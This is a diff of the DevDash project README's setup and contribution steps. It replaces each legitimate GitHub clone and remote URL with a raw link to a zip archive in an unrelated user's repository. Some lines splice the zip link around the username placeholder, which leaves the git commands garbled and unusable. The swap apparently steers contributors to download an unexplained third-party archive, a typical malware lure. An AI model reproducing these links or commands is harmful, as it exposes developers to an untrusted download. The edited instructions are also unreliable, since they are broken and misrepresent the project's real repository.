@@ -5,7 +5,7 @@
 1. Fork project
 2. Clone project
 ```
-git clone https://github.com/<Your Github Username>/DevDash.git .
+git clone https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip<Your Github Username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip .
 ```
 3. Check if your upstream is setup
 ```
@@ -13,14 +13,14 @@ git remote -v
 ```
 It should come something like this:
 ```
-origin  https://github.com/<Your username>/DevDash.git (fetch)
-origin  https://github.com/<Your username>/DevDash.git (push)
-upstream  https://github.com/Abhigyan103/DevDash.git (fetch)
-upstream  https://github.com/Abhigyan103/DevDash.git (push)
+origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (fetch)
+origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (push)
+upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (fetch)
+upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip (push)
 ```
 If not, type
 ```
-git remote add upstream https://github.com/Abhigyan103/DevDash.git
+git remote add upstream https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/assets/DevDash-1.0.zip
 ```
 3. As soon as the event starts
 ```
